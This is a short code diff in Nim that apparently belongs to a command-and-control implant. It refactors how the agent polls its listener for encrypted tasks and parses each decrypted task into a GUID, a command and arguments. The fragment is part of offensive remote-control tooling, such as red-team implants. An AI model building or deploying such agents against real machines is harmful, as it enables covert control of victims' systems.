@@ -118,6 +118,12 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
     else:
         li.registered = true
 
+type
+  Command = object
+    guid: string
+    command: string
+    args: seq[string]
+
 # Watch for queued commands via GET request to the task path
 proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     var 
@@ -137,20 +143,15 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     else:
         try:
             # Attempt to parse task (parseJson() needs string literal... sigh)
-            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\\\"")
+            var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey) #.replace("\'", "\\\"")
             var parsedResponseData = parseJson(responseData)
+            var jsonData = to(parsedResponseData, Command)
+
 
             # Get the task and task GUID from the response
-            var task = parsedResponseData["task"].getStr()
-            cmdGuid = parsedResponseData["guid"].getStr()
-
-            try:
-                # Arguments are included with the task
-                cmd = task.split(' ', 1)[0].toLower()
-                args = parseCmdLine(task.split(' ', 1)[1])
-            except:
-                # There are no arguments
-                cmd = task.split(' ', 1)[0].toLower()
+            cmdGuid = jsonData.guid
+            cmd = jsonData.command
+            args = jsonData.args
         except:
             # No task has been returned
             cmdGuid = ""
